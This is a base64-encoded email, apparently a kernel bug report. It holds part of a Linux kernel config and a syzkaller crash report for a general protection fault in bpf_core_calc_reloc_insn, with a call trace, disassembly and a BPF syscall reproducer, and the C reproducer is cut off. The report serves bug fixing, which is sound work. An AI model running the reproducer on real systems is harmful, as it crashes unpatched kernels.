IG5vdCBzZXQKIyBDT05GSUdfREVCVUdfQ0dST1VQX1JFRiBpcyBub3Qgc2V0CkNPTkZJR19VU0VS
X1NUQUNLVFJBQ0VfU1VQUE9SVD15CkNPTkZJR19OT1BfVFJBQ0VSPXkKQ09ORklHX0hBVkVfUkVU
SE9PSz15CkNPTkZJR19SRVRIT09LPXkKQ09ORklHX0hBVkVfRlVOQ1RJT05fVFJBQ0VSPXkKQ09O
RklHX0hBVkVfRFlOQU1JQ19GVFJBQ0U9eQpDT05GSUdfSEFWRV9EWU5BTUlDX0ZUUkFDRV9XSVRI
X1JFR1M9eQpDT05GSUdfSEFWRV9EWU5BTUlDX0ZUUkFDRV9XSVRIX0RJUkVDVF9DQUxMUz15CkNP
TkZJR19IQVZFX0RZTkFNSUNfRlRSQUNFX1dJVEhfQVJHUz15CkNPTkZJR19IQVZFX0RZTkFNSUNf
RlRSQUNFX05PX1BBVENIQUJMRT15CkNPTkZJR19IQVZFX0ZUUkFDRV9NQ09VTlRfUkVDT1JEPXkK
Q09ORklHX0hBVkVfU1lTQ0FMTF9UUkFDRVBPSU5UUz15CkNPTkZJR19IQVZFX0ZFTlRSWT15CkNP
TkZJR19IQVZFX09CSlRPT0xfTUNPVU5UPXkKQ09ORklHX0hBVkVfT0JKVE9PTF9OT1BfTUNPVU5U
PXkKQ09ORklHX0hBVkVfQ19SRUNPUkRNQ09VTlQ9eQpDT05GSUdfSEFWRV9CVUlMRFRJTUVfTUNP
VU5UX1NPUlQ9eQpDT05GSUdfVFJBQ0VfQ0xPQ0s9eQpDT05GSUdfUklOR19CVUZGRVI9eQpDT05G
SUdfRVZFTlRfVFJBQ0lORz15CkNPTkZJR19DT05URVhUX1NXSVRDSF9UUkFDRVI9eQpDT05GSUdf
VFJBQ0lORz15CkNPTkZJR19HRU5FUklDX1RSQUNFUj15CkNPTkZJR19UUkFDSU5HX1NVUFBPUlQ9
eQpDT05GSUdfRlRSQUNFPXkKIyBDT05GSUdfQk9PVFRJTUVfVFJBQ0lORyBpcyBub3Qgc2V0CiMg
Q09ORklHX0ZVTkNUSU9OX1RSQUNFUiBpcyBub3Qgc2V0CiMgQ09ORklHX1NUQUNLX1RSQUNFUiBp
cyBub3Qgc2V0CiMgQ09ORklHX0lSUVNPRkZfVFJBQ0VSIGlzIG5vdCBzZXQKIyBDT05GSUdfUFJF
RU1QVF9UUkFDRVIgaXMgbm90IHNldAojIENPTkZJR19TQ0hFRF9UUkFDRVIgaXMgbm90IHNldAoj
IENPTkZJR19IV0xBVF9UUkFDRVIgaXMgbm90IHNldAojIENPTkZJR19PU05PSVNFX1RSQUNFUiBp
cyBub3Qgc2V0CiMgQ09ORklHX1RJTUVSTEFUX1RSQUNFUiBpcyBub3Qgc2V0CiMgQ09ORklHX01N
SU9UUkFDRSBpcyBub3Qgc2V0CiMgQ09ORklHX0ZUUkFDRV9TWVNDQUxMUyBpcyBub3Qgc2V0CiMg
Q09ORklHX1RSQUNFUl9TTkFQU0hPVCBpcyBub3Qgc2V0CkNPTkZJR19CUkFOQ0hfUFJPRklMRV9O
T05FPXkKIyBDT05GSUdfUFJPRklMRV9BTk5PVEFURURfQlJBTkNIRVMgaXMgbm90IHNldAojIENP
TkZJR19QUk9GSUxFX0FMTF9CUkFOQ0hFUyBpcyBub3Qgc2V0CkNPTkZJR19CTEtfREVWX0lPX1RS
QUNFPXkKQ09ORklHX0tQUk9CRV9FVkVOVFM9eQpDT05GSUdfVVBST0JFX0VWRU5UUz15CkNPTkZJ
R19CUEZfRVZFTlRTPXkKQ09ORklHX0RZTkFNSUNfRVZFTlRTPXkKQ09ORklHX1BST0JFX0VWRU5U
Uz15CiMgQ09ORklHX1NZTlRIX0VWRU5UUyBpcyBub3Qgc2V0CiMgQ09ORklHX1VTRVJfRVZFTlRT
IGlzIG5vdCBzZXQKIyBDT05GSUdfSElTVF9UUklHR0VSUyBpcyBub3Qgc2V0CiMgQ09ORklHX1RS
QUNFX0VWRU5UX0lOSkVDVCBpcyBub3Qgc2V0CiMgQ09ORklHX1RSQUNFUE9JTlRfQkVOQ0hNQVJL
IGlzIG5vdCBzZXQKIyBDT05GSUdfUklOR19CVUZGRVJfQkVOQ0hNQVJLIGlzIG5vdCBzZXQKIyBD
T05GSUdfVFJBQ0VfRVZBTF9NQVBfRklMRSBpcyBub3Qgc2V0CiMgQ09ORklHX0ZUUkFDRV9TVEFS
VFVQX1RFU1QgaXMgbm90IHNldAojIENPTkZJR19SSU5HX0JVRkZFUl9TVEFSVFVQX1RFU1QgaXMg
bm90IHNldAojIENPTkZJR19SSU5HX0JVRkZFUl9WQUxJREFURV9USU1FX0RFTFRBUyBpcyBub3Qg
c2V0CiMgQ09ORklHX1BSRUVNUFRJUlFfREVMQVlfVEVTVCBpcyBub3Qgc2V0CiMgQ09ORklHX0tQ
Uk9CRV9FVkVOVF9HRU5fVEVTVCBpcyBub3Qgc2V0CiMgQ09ORklHX1JWIGlzIG5vdCBzZXQKQ09O
RklHX1BST1ZJREVfT0hDSTEzOTRfRE1BX0lOSVQ9eQojIENPTkZJR19TQU1QTEVTIGlzIG5vdCBz
ZXQKQ09ORklHX0hBVkVfU0FNUExFX0ZUUkFDRV9ESVJFQ1Q9eQpDT05GSUdfSEFWRV9TQU1QTEVf
RlRSQUNFX0RJUkVDVF9NVUxUST15CkNPTkZJR19BUkNIX0hBU19ERVZNRU1fSVNfQUxMT1dFRD15
CkNPTkZJR19TVFJJQ1RfREVWTUVNPXkKIyBDT05GSUdfSU9fU1RSSUNUX0RFVk1FTSBpcyBub3Qg
c2V0CgojCiMgeDg2IERlYnVnZ2luZwojCkNPTkZJR19FQVJMWV9QUklOVEtfVVNCPXkKQ09ORklH
X1g4Nl9WRVJCT1NFX0JPT1RVUD15CkNPTkZJR19FQVJMWV9QUklOVEs9eQpDT05GSUdfRUFSTFlf
UFJJTlRLX0RCR1A9eQojIENPTkZJR19FQVJMWV9QUklOVEtfVVNCX1hEQkMgaXMgbm90IHNldAoj
IENPTkZJR19FRklfUEdUX0RVTVAgaXMgbm90IHNldAojIENPTkZJR19ERUJVR19UTEJGTFVTSCBp
cyBub3Qgc2V0CkNPTkZJR19IQVZFX01NSU9UUkFDRV9TVVBQT1JUPXkKIyBDT05GSUdfWDg2X0RF
Q09ERVJfU0VMRlRFU1QgaXMgbm90IHNldApDT05GSUdfSU9fREVMQVlfMFg4MD15CiMgQ09ORklH
X0lPX0RFTEFZXzBYRUQgaXMgbm90IHNldAojIENPTkZJR19JT19ERUxBWV9VREVMQVkgaXMgbm90
IHNldAojIENPTkZJR19JT19ERUxBWV9OT05FIGlzIG5vdCBzZXQKQ09ORklHX0RFQlVHX0JPT1Rf
UEFSQU1TPXkKIyBDT05GSUdfQ1BBX0RFQlVHIGlzIG5vdCBzZXQKQ09ORklHX0RFQlVHX0VOVFJZ
PXkKIyBDT05GSUdfREVCVUdfTk1JX1NFTEZURVNUIGlzIG5vdCBzZXQKQ09ORklHX1g4Nl9ERUJV
R19GUFU9eQojIENPTkZJR19QVU5JVF9BVE9NX0RFQlVHIGlzIG5vdCBzZXQKQ09ORklHX1VOV0lO
REVSX09SQz15CiMgQ09ORklHX1VOV0lOREVSX0ZSQU1FX1BPSU5URVIgaXMgbm90IHNldAojIGVu
ZCBvZiB4ODYgRGVidWdnaW5nCgojCiMgS2VybmVsIFRlc3RpbmcgYW5kIENvdmVyYWdlCiMKIyBD
T05GSUdfS1VOSVQgaXMgbm90IHNldAojIENPTkZJR19OT1RJRklFUl9FUlJPUl9JTkpFQ1RJT04g
aXMgbm90IHNldAojIENPTkZJR19GVU5DVElPTl9FUlJPUl9JTkpFQ1RJT04gaXMgbm90IHNldAoj
IENPTkZJR19GQVVMVF9JTkpFQ1RJT04gaXMgbm90IHNldApDT05GSUdfQVJDSF9IQVNfS0NPVj15
CkNPTkZJR19DQ19IQVNfU0FOQ09WX1RSQUNFX1BDPXkKQ09ORklHX0tDT1Y9eQpDT05GSUdfS0NP
Vl9FTkFCTEVfQ09NUEFSSVNPTlM9eQpDT05GSUdfS0NPVl9JTlNUUlVNRU5UX0FMTD15CkNPTkZJ
R19LQ09WX0lSUV9BUkVBX1NJWkU9MHg0MDAwMApDT05GSUdfUlVOVElNRV9URVNUSU5HX01FTlU9
eQojIENPTkZJR19URVNUX0RIUlkgaXMgbm90IHNldAojIENPTkZJR19MS0RUTSBpcyBub3Qgc2V0
CiMgQ09ORklHX1RFU1RfTUlOX0hFQVAgaXMgbm90IHNldAojIENPTkZJR19URVNUX0RJVjY0IGlz
IG5vdCBzZXQKIyBDT05GSUdfQkFDS1RSQUNFX1NFTEZfVEVTVCBpcyBub3Qgc2V0CiMgQ09ORklH
X1RFU1RfUkVGX1RSQUNLRVIgaXMgbm90IHNldAojIENPTkZJR19SQlRSRUVfVEVTVCBpcyBub3Qg
c2V0CiMgQ09ORklHX1JFRURfU09MT01PTl9URVNUIGlzIG5vdCBzZXQKIyBDT05GSUdfSU5URVJW
QUxfVFJFRV9URVNUIGlzIG5vdCBzZXQKIyBDT05GSUdfUEVSQ1BVX1RFU1QgaXMgbm90IHNldAoj
IENPTkZJR19BVE9NSUM2NF9TRUxGVEVTVCBpcyBub3Qgc2V0CiMgQ09ORklHX1RFU1RfSEVYRFVN
UCBpcyBub3Qgc2V0CiMgQ09ORklHX1RFU1RfS1NUUlRPWCBpcyBub3Qgc2V0CiMgQ09ORklHX1RF
U1RfUFJJTlRGIGlzIG5vdCBzZXQKIyBDT05GSUdfVEVTVF9TQ0FORiBpcyBub3Qgc2V0CiMgQ09O
RklHX1RFU1RfQklUTUFQIGlzIG5vdCBzZXQKIyBDT05GSUdfVEVTVF9VVUlEIGlzIG5vdCBzZXQK
IyBDT05GSUdfVEVTVF9YQVJSQVkgaXMgbm90IHNldAojIENPTkZJR19URVNUX01BUExFX1RSRUUg
aXMgbm90IHNldAojIENPTkZJR19URVNUX1JIQVNIVEFCTEUgaXMgbm90IHNldAojIENPTkZJR19U
RVNUX0lEQSBpcyBub3Qgc2V0CiMgQ09ORklHX1RFU1RfTEtNIGlzIG5vdCBzZXQKIyBDT05GSUdf
VEVTVF9CSVRPUFMgaXMgbm90IHNldAojIENPTkZJR19URVNUX1ZNQUxMT0MgaXMgbm90IHNldAoj
IENPTkZJR19URVNUX0JQRiBpcyBub3Qgc2V0CiMgQ09ORklHX1RFU1RfQkxBQ0tIT0xFX0RFViBp
cyBub3Qgc2V0CiMgQ09ORklHX0ZJTkRfQklUX0JFTkNITUFSSyBpcyBub3Qgc2V0CiMgQ09ORklH
X1RFU1RfRklSTVdBUkUgaXMgbm90IHNldAojIENPTkZJR19URVNUX1NZU0NUTCBpcyBub3Qgc2V0
CiMgQ09ORklHX1RFU1RfVURFTEFZIGlzIG5vdCBzZXQKIyBDT05GSUdfVEVTVF9TVEFUSUNfS0VZ
UyBpcyBub3Qgc2V0CiMgQ09ORklHX1RFU1RfS01PRCBpcyBub3Qgc2V0CiMgQ09ORklHX1RFU1Rf
TUVNQ0FUX1AgaXMgbm90IHNldAojIENPTkZJR19URVNUX01FTUlOSVQgaXMgbm90IHNldAojIENP
TkZJR19URVNUX0ZSRUVfUEFHRVMgaXMgbm90IHNldAojIENPTkZJR19URVNUX0NMT0NLU09VUkNF
X1dBVENIRE9HIGlzIG5vdCBzZXQKIyBDT05GSUdfVEVTVF9PQkpQT09MIGlzIG5vdCBzZXQKQ09O
RklHX0FSQ0hfVVNFX01FTVRFU1Q9eQojIENPTkZJR19NRU1URVNUIGlzIG5vdCBzZXQKIyBlbmQg
b2YgS2VybmVsIFRlc3RpbmcgYW5kIENvdmVyYWdlCgojCiMgUnVzdCBoYWNraW5nCiMKIyBlbmQg
b2YgUnVzdCBoYWNraW5nCiMgZW5kIG9mIEtlcm5lbCBoYWNraW5nCg==
--000000000000dda6d2062019f35f
Content-Type: text/plain; charset="US-ASCII"; name="report.txt"
Content-Disposition: attachment; filename="report.txt"
Content-Transfer-Encoding: base64
Content-ID: <f_m027qbkr2>
X-Attachment-Id: f_m027qbkr2

U3l6a2FsbGVyIGhpdCAnZ2VuZXJhbCBwcm90ZWN0aW9uIGZhdWx0IGluIGJwZl9jb3JlX2NhbGNf
cmVsb19pbnNuJyBidWcuDQoNCmF1ZGl0OiB0eXBlPTE0MDAgYXVkaXQoMTcyNDA5OTg4Ni41NTk6
OSk6IGF2YzogIGRlbmllZCAgeyBleGVjbWVtIH0gZm9yICBwaWQ9MjU1IGNvbW09InN5ei1leGVj
dXRvcjQ0MyIgc2NvbnRleHQ9dW5jb25maW5lZF91OnVuY29uZmluZWRfcjp1bmNvbmZpbmVkX3Q6
czAtczA6YzAuYzEwMjMgdGNvbnRleHQ9dW5jb25maW5lZF91OnVuY29uZmluZWRfcjp1bmNvbmZp
bmVkX3Q6czAtczA6YzAuYzEwMjMgdGNsYXNzPXByb2Nlc3MgcGVybWlzc2l2ZT0xDQpPb3BzOiBn
ZW5lcmFsIHByb3RlY3Rpb24gZmF1bHQsIHByb2JhYmx5IGZvciBub24tY2Fub25pY2FsIGFkZHJl
c3MgMHhkZmZmZmMwMDAwMDAwMDAwOiAwMDAwIFsjMV0gUFJFRU1QVCBTTVAgS0FTQU4gTk9QVEkN
CktBU0FOOiBudWxsLXB0ci1kZXJlZiBpbiByYW5nZSBbMHgwMDAwMDAwMDAwMDAwMDAwLTB4MDAw
MDAwMDAwMDAwMDAwN10NCkNQVTogMyBQSUQ6IDI1NiBDb21tOiBzeXotZXhlY3V0b3I0NDMgTm90
IHRhaW50ZWQgNi4xMC41ICMyDQpIYXJkd2FyZSBuYW1lOiBRRU1VIFN0YW5kYXJkIFBDIChpNDQw
RlggKyBQSUlYLCAxOTk2KSwgQklPUyAxLjE1LjAtMSAwNC8wMS8yMDE0DQpSSVA6IDAwMTA6YnBm
X2NvcmVfY2FsY19yZWxvX2luc24rMHgxMWUvMHgxZTkwIHRvb2xzL2xpYi9icGYvcmVsb19jb3Jl
LmM6MTMwMA0KQ29kZTogNDggOGIgODUgMjggZmQgZmYgZmYgNGMgODkgZWYgNDQgOGIgNzAgMDQg
NDQgODkgZjYgZTggOTYgYmQgZjggZmYgNDggODkgYzIgNDkgODkgYzQgNDggYjggMDAgMDAgMDAg
MDAgMDAgZmMgZmYgZGYgNDggYzEgZWEgMDMgPDBmPiBiNiAxNCAwMiA0YyA4OSBlMCA4MyBlMCAw
NyA4MyBjMCAwMyAzOCBkMCA3YyAwOCA4NCBkMiAwZiA4NSAyYw0KUlNQOiAwMDE4OmZmZmY4ODgx
MGY4MWYzZDAgRUZMQUdTOiAwMDAxMDI0Ng0KUkFYOiBkZmZmZmMwMDAwMDAwMDAwIFJCWDogZGZm
ZmZjMDAwMDAwMDAwMCBSQ1g6IGZmZmZmZmZmODE2YzRjZWINClJEWDogMDAwMDAwMDAwMDAwMDAw
MCBSU0k6IGZmZmZmZmZmODE2YzRkNGEgUkRJOiAwMDAwMDAwMDAwMDAwMDA0DQpSQlA6IGZmZmY4
ODgxMGY4MWY2YzAgUjA4OiBmZmZmODg4MTBmODFmNzc4IFIwOTogZmZmZjg4ODEwZDdmMDAwMA0K
UjEwOiAwMDAwMDAwMDAwMDAwMDA0IFIxMTogZmZmZjg4ODEwZDQ0N2M4MCBSMTI6IDAwMDAwMDAw
MDAwMDAwMDANClIxMzogZmZmZjg4ODEwYTk1NjAwMCBSMTQ6IDAwMDAwMDAwMDAwMDAwMDQgUjE1
OiBmZmZmODg4MTBkN2YwMDAwDQpGUzogIDAwMDA3Zjg2ODhiNTM2NDAoMDAwMCkgR1M6ZmZmZjg4
ODExYjE4MDAwMCgwMDAwKSBrbmxHUzowMDAwMDAwMDAwMDAwMDAwDQpDUzogIDAwMTAgRFM6IDAw
MDAgRVM6IDAwMDAgQ1IwOiAwMDAwMDAwMDgwMDUwMDMzDQpDUjI6IDAwMDAwMDAwMjAwMDBkNDIg
Q1IzOiAwMDAwMDAwMTEyMDBhMDAwIENSNDogMDAwMDAwMDAwMDc1MGVmMA0KUEtSVTogNTU1NTU1
NTQNCkNhbGwgVHJhY2U6DQogPFRBU0s+DQogYnBmX2NvcmVfYXBwbHkrMHg0OGIvMHhhZjAga2Vy
bmVsL2JwZi9idGYuYzo4NzU5DQogY2hlY2tfY29yZV9yZWxvIGtlcm5lbC9icGYvdmVyaWZpZXIu
YzoxNjQ3MCBbaW5saW5lXQ0KIGNoZWNrX2J0Zl9pbmZvIGtlcm5lbC9icGYvdmVyaWZpZXIuYzox
NjUyNyBbaW5saW5lXQ0KIGJwZl9jaGVjaysweDY3NGIvMHhiYTAwIGtlcm5lbC9icGYvdmVyaWZp
ZXIuYzoyMTY1MA0KIGJwZl9wcm9nX2xvYWQrMHgxNTFjLzB4MjQ1MCBrZXJuZWwvYnBmL3N5c2Nh
bGwuYzoyOTA4DQogX19zeXNfYnBmKzB4MTJiMy8weDUyMTAga2VybmVsL2JwZi9zeXNjYWxsLmM6
NTY4OA0KIF9fZG9fc3lzX2JwZiBrZXJuZWwvYnBmL3N5c2NhbGwuYzo1Nzk1IFtpbmxpbmVdDQog
X19zZV9zeXNfYnBmIGtlcm5lbC9icGYvc3lzY2FsbC5jOjU3OTMgW2lubGluZV0NCiBfX3g2NF9z
eXNfYnBmKzB4NzgvMHhjMCBrZXJuZWwvYnBmL3N5c2NhbGwuYzo1NzkzDQogZG9fc3lzY2FsbF94
NjQgYXJjaC94ODYvZW50cnkvY29tbW9uLmM6NTIgW2lubGluZV0NCiBkb19zeXNjYWxsXzY0KzB4
YTYvMHgxYTAgYXJjaC94ODYvZW50cnkvY29tbW9uLmM6ODMNCiBlbnRyeV9TWVNDQUxMXzY0X2Fm
dGVyX2h3ZnJhbWUrMHg3Ny8weDdmDQpSSVA6IDAwMzM6MHg3Zjg2ODhiYWU4MmQNCkNvZGU6IGMz
IGU4IGQ3IDFlIDAwIDAwIDBmIDFmIDgwIDAwIDAwIDAwIDAwIGYzIDBmIDFlIGZhIDQ4IDg5IGY4
IDQ4IDg5IGY3IDQ4IDg5IGQ2IDQ4IDg5IGNhIDRkIDg5IGMyIDRkIDg5IGM4IDRjIDhiIDRjIDI0
IDA4IDBmIDA1IDw0OD4gM2QgMDEgZjAgZmYgZmYgNzMgMDEgYzMgNDggYzcgYzEgYjAgZmYgZmYg
ZmYgZjcgZDggNjQgODkgMDEgNDgNClJTUDogMDAyYjowMDAwN2Y4Njg4YjUzMWI4IEVGTEFHUzog
MDAwMDAyNDYgT1JJR19SQVg6IDAwMDAwMDAwMDAwMDAxNDENClJBWDogZmZmZmZmZmZmZmZmZmZk
YSBSQlg6IDAwMDA3Zjg2ODhjNDkyMDggUkNYOiAwMDAwN2Y4Njg4YmFlODJkDQpSRFg6IDAwMDAw
MDAwMDAwMDAwOTAgUlNJOiAwMDAwMDAwMDIwMDAwNDgwIFJESTogMDAwMDAwMDAwMDAwMDAwNQ0K
UkJQOiAwMDAwN2Y4Njg4YzQ5MjAwIFIwODogMDAwMDAwMDAwMDAwMDAwMCBSMDk6IDAwMDA3Zjg2
ODhiNTM2NDANClIxMDogMDAwMDAwMDAwMDAwMDAwMCBSMTE6IDAwMDAwMDAwMDAwMDAyNDYgUjEy
OiAwMDAwN2Y4Njg4YzQ5MjBjDQpSMTM6IDAwMDAwMDAwMDAwMDAwMDAgUjE0OiAwMDAwN2Y4Njg4
Yjc3YTAwIFIxNTogMDAwMDdmODY4OGIzMzAwMA0KIDwvVEFTSz4NCk1vZHVsZXMgbGlua2VkIGlu
Og0KLS0tWyBlbmQgdHJhY2UgMDAwMDAwMDAwMDAwMDAwMCBdLS0tDQpSSVA6IDAwMTA6YnBmX2Nv
cmVfY2FsY19yZWxvX2luc24rMHgxMWUvMHgxZTkwIHRvb2xzL2xpYi9icGYvcmVsb19jb3JlLmM6
MTMwMA0KQ29kZTogNDggOGIgODUgMjggZmQgZmYgZmYgNGMgODkgZWYgNDQgOGIgNzAgMDQgNDQg
ODkgZjYgZTggOTYgYmQgZjggZmYgNDggODkgYzIgNDkgODkgYzQgNDggYjggMDAgMDAgMDAgMDAg
MDAgZmMgZmYgZGYgNDggYzEgZWEgMDMgPDBmPiBiNiAxNCAwMiA0YyA4OSBlMCA4MyBlMCAwNyA4
MyBjMCAwMyAzOCBkMCA3YyAwOCA4NCBkMiAwZiA4NSAyYw0KUlNQOiAwMDE4OmZmZmY4ODgxMGY4
MWYzZDAgRUZMQUdTOiAwMDAxMDI0Ng0KUkFYOiBkZmZmZmMwMDAwMDAwMDAwIFJCWDogZGZmZmZj
MDAwMDAwMDAwMCBSQ1g6IGZmZmZmZmZmODE2YzRjZWINClJEWDogMDAwMDAwMDAwMDAwMDAwMCBS
U0k6IGZmZmZmZmZmODE2YzRkNGEgUkRJOiAwMDAwMDAwMDAwMDAwMDA0DQpSQlA6IGZmZmY4ODgx
MGY4MWY2YzAgUjA4OiBmZmZmODg4MTBmODFmNzc4IFIwOTogZmZmZjg4ODEwZDdmMDAwMA0KUjEw
OiAwMDAwMDAwMDAwMDAwMDA0IFIxMTogZmZmZjg4ODEwZDQ0N2M4MCBSMTI6IDAwMDAwMDAwMDAw
MDAwMDANClIxMzogZmZmZjg4ODEwYTk1NjAwMCBSMTQ6IDAwMDAwMDAwMDAwMDAwMDQgUjE1OiBm
ZmZmODg4MTBkN2YwMDAwDQpGUzogIDAwMDA3Zjg2ODhiNTM2NDAoMDAwMCkgR1M6ZmZmZjg4ODEx
YjE4MDAwMCgwMDAwKSBrbmxHUzowMDAwMDAwMDAwMDAwMDAwDQpDUzogIDAwMTAgRFM6IDAwMDAg
RVM6IDAwMDAgQ1IwOiAwMDAwMDAwMDgwMDUwMDMzDQpDUjI6IDAwMDAwMDAwMjAwMDBkNDIgQ1Iz
OiAwMDAwMDAwMTEyMDBhMDAwIENSNDogMDAwMDAwMDAwMDc1MGVmMA0KUEtSVTogNTU1NTU1NTQN
Ci0tLS0tLS0tLS0tLS0tLS0NCkNvZGUgZGlzYXNzZW1ibHkgKGJlc3QgZ3Vlc3MpOg0KICAgMDoJ
NDggOGIgODUgMjggZmQgZmYgZmYgCW1vdiAgICAtMHgyZDgoJXJicCksJXJheA0KICAgNzoJNGMg
ODkgZWYgICAgICAgICAgICAgCW1vdiAgICAlcjEzLCVyZGkNCiAgIGE6CTQ0IDhiIDcwIDA0ICAg
ICAgICAgIAltb3YgICAgMHg0KCVyYXgpLCVyMTRkDQogICBlOgk0NCA4OSBmNiAgICAgICAgICAg
ICAJbW92ICAgICVyMTRkLCVlc2kNCiAgMTE6CWU4IDk2IGJkIGY4IGZmICAgICAgIAljYWxsICAg
MHhmZmY4YmRhYw0KICAxNjoJNDggODkgYzIgICAgICAgICAgICAgCW1vdiAgICAlcmF4LCVyZHgN
CiAgMTk6CTQ5IDg5IGM0ICAgICAgICAgICAgIAltb3YgICAgJXJheCwlcjEyDQogIDFjOgk0OCBi
OCAwMCAwMCAwMCAwMCAwMCAJbW92YWJzICQweGRmZmZmYzAwMDAwMDAwMDAsJXJheA0KICAyMzoJ
ZmMgZmYgZGYNCiAgMjY6CTQ4IGMxIGVhIDAzICAgICAgICAgIAlzaHIgICAgJDB4MywlcmR4DQoq
IDJhOgkwZiBiNiAxNCAwMiAgICAgICAgICAJbW92emJsICglcmR4LCVyYXgsMSksJWVkeCA8LS0g
dHJhcHBpbmcgaW5zdHJ1Y3Rpb24NCiAgMmU6CTRjIDg5IGUwICAgICAgICAgICAgIAltb3YgICAg
JXIxMiwlcmF4DQogIDMxOgk4MyBlMCAwNyAgICAgICAgICAgICAJYW5kICAgICQweDcsJWVheA0K
ICAzNDoJODMgYzAgMDMgICAgICAgICAgICAgCWFkZCAgICAkMHgzLCVlYXgNCiAgMzc6CTM4IGQw
ICAgICAgICAgICAgICAgIAljbXAgICAgJWRsLCVhbA0KICAzOToJN2MgMDggICAgICAgICAgICAg
ICAgCWpsICAgICAweDQzDQogIDNiOgk4NCBkMiAgICAgICAgICAgICAgICAJdGVzdCAgICVkbCwl
ZGwNCiAgM2Q6CTBmICAgICAgICAgICAgICAgICAgIAkuYnl0ZSAweGYNCiAgM2U6CTg1ICAgICAg
ICAgICAgICAgICAgIAkuYnl0ZSAweDg1DQogIDNmOgkyYyAgICAgICAgICAgICAgICAgICAJLmJ5
dGUgMHgyYw0KDQoNClN5emthbGxlciByZXByb2R1Y2VyOg0KIyB7VGhyZWFkZWQ6dHJ1ZSBSZXBl
YXQ6ZmFsc2UgUmVwZWF0VGltZXM6MCBQcm9jczoxIFNsb3dkb3duOjEgU2FuZGJveDogU2FuZGJv
eEFyZzowIExlYWs6ZmFsc2UgTmV0SW5qZWN0aW9uOmZhbHNlIE5ldERldmljZXM6ZmFsc2UgTmV0
UmVzZXQ6ZmFsc2UgQ2dyb3VwczpmYWxzZSBCaW5mbXRNaXNjOmZhbHNlIENsb3NlRkRzOmZhbHNl
IEtDU0FOOmZhbHNlIERldmxpbmtQQ0k6ZmFsc2UgTmljVkY6ZmFsc2UgVVNCOmZhbHNlIFZoY2lJ
bmplY3Rpb246ZmFsc2UgV2lmaTpmYWxzZSBJRUVFODAyMTU0OmZhbHNlIFN5c2N0bDpmYWxzZSBT
d2FwOmZhbHNlIFVzZVRtcERpcjpmYWxzZSBIYW5kbGVTZWd2OmZhbHNlIFRyYWNlOmZhbHNlIExl
Z2FjeU9wdGlvbnM6e0NvbGxpZGU6ZmFsc2UgRmF1bHQ6ZmFsc2UgRmF1bHRDYWxsOjAgRmF1bHRO
dGg6MH19DQpyMCA9IGJwZiRCUEZfQlRGX0xPQUQoMHgxMiwgJigweDdmMDAwMDAwNGU0MCk9eyYo
MHg3ZjAwMDAwMDRjODApPXt7MHhlYjlmLCAweDEsIDB4MCwgMHgxOCwgMHgwLCAweGMsIDB4Yywg
MHhhLCBbQHVuaW9uPXsweDgsIDB4MCwgMHgwLCAweDUsIDB4MCwgMHg2fV19LCB7MHgwLCBbMHgz
MCwgMHgwLCAweDMwLCAweDYxLCAweDFlLCAweDJmLCAweDMwLCAweDJlXX19LCAweDAsIDB4MmUs
IDB4MCwgMHgxLCAweDQwfSwgMHgyMCkNCmJwZiRQUk9HX0xPQURfWERQKDB4NSwgJigweDdmMDAw
MDAwMDQ4MCk9ezB4NiwgMHgyNywgJigweDdmMDAwMDAwMGQ0MCk9QHJpbmdidWY9e3sweDE4LCAw
eDAsIDB4MCwgMHgwLCAweDgsIDB4MCwgMHgwLCAweDAsIDB4N30sIHt9LCB7fSwgW0ByaW5nYnVm
X3F1ZXJ5LCBAcHJpbnRrPXtAcCwge30sIHt9LCB7fSwge30sIHsweDcsIDB4MCwgMHhiLCAweDMs
IDB4MCwgMHgwLCAweGZmZmZ9fSwgQHByaW50az17QGxsZCwge30sIHt9LCB7fSwge30sIHsweDcs
IDB4MCwgMHhiLCAweDMsIDB4MCwgMHgwLCAweDd9fSwgQG1hcF9pZHg9ezB4MTgsIDB4OCwgMHg1
LCAweDAsIDB4MX0sIEBtYXBfaWR4X3ZhbD17MHgxOCwgMHg2LCAweDYsIDB4MCwgMHg0LCAweDAs
IDB4MCwgMHgwLCAweGZmZmZmZmZifV0sIHt7fSwge30sIHsweDg1LCAweDAsIDB4MCwgMHg4NH19
fSwgJigweDdmMDAwMDAwMDA0MCk9J0dQTFx4MDAnLCAweGIsIDB4YzAsICYoMHg3ZjAwMDAwMDBj
ODApPSIiLzE5MiwgMHg0MTEwMCwgMHgzOCwgJ1x4MDAnLCAweDAsIDB4MjUsIHIwLCAweDgsIDB4
MCwgMHgwLCAweDEwLCAmKDB4N2YwMDAwMDAwMmMwKT17MHgwLCAweDAsIDB4MCwgMHg5fSwgMHgx
LCAweDAsIDB4MCwgMHg5LCAmKDB4N2YwMDAwMDAwMzgwKT1bMHhmZmZmZmZmZmZmZmZmZmZmLCAw
eGZmZmZmZmZmZmZmZmZmZmYsIDB4ZmZmZmZmZmZmZmZmZmZmZl0sICYoMHg3ZjAwMDAwMDAzYzAp
PVt7MHgxLCAweDQsIDB4YiwgMHg2fSwgezB4MiwgMHgyLCAweDF9LCB7MHg1LCAweDQsIDB4ZSwg
MHhifSwgezB4MiwgMHgxMDAwMDAzLCAweDIsIDB4M30sIHsweDIsIDB4NSwgMHhhLCAweDV9LCB7
MHgzLCAweDEsIDB4YSwgMHgzfSwgezB4MywgMHgzLCAweDUsIDB4OH0sIHsweDMsIDB4MSwgMHg1
LCAweDV9LCB7MHgwLCAweDIsIDB4MCwgMHg3fV0sIDB4MTAsIDB4MTAwMDB9LCAweDkwKSAoYXN5
bmMpDQpicGYkTUFQX1VQREFURV9FTEVNX1RBSUxfQ0FMTCgweDIsICYoMHg3ZjAwMDAwMDA0NDAp
PXt7fSwgJigweDdmMDAwMDAwMDNjMCksIDB4MH0sIDB4MjApDQoNCg0KQyByZXByb2R1Y2VyOg0K
Ly8gYXV0b2dlbmVyYXRlZCBieSBzeXprYWxsZXIgKGh0dHBzOi8vZ2l0aHViLmNvbS9nb29nbGUv
c3l6a2FsbGVyKQ0KDQojZGVmaW5lIF9HTlVfU09VUkNFIA0KDQojaW5jbHVkZSA8ZW5kaWFuLmg+
DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxwdGhyZWFkLmg+DQojaW5jbHVkZSA8c3Rk
aW50Lmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRl
IDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzeXMvc3lzY2FsbC5oPg0KI2luY2x1ZGUgPHN5cy90eXBl
